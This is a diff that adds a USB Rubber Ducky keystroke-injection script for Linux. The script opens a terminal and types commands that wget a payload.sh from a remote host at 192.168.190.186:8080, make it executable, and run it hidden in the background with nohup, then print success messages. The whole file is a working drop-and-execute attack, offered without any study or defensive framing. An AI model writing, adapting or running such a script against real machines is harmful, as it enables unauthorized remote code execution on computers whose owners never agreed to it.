@@ -1,0 +1,30 @@
+REM Rubber Ducky Script 
+REM Designed for reliable payload delivery
+
+DELAY 1000
+REM Open terminal
+CTRL ALT t
+DELAY 1500
+
+REM Download the improved payload that has retry mechanisms
+STRING wget http://192.168.190.186:8080/payload.sh -O /tmp/p.sh
+DELAY 500
+ENTER
+DELAY 2000
+
+REM Make the script executable
+STRING chmod +x /tmp/p.sh
+DELAY 300
+ENTER
+DELAY 1000
+
+REM Execute the payload properly in background
+STRING (nohup bash /tmp/p.sh > /tmp/p.log 2>&1 &) && echo "Payload launched successfully"
+DELAY 300
+ENTER
+
+REM Show success message
+STRING echo "Payload launched successfully in background"
+DELAY 300
+ENTER
+
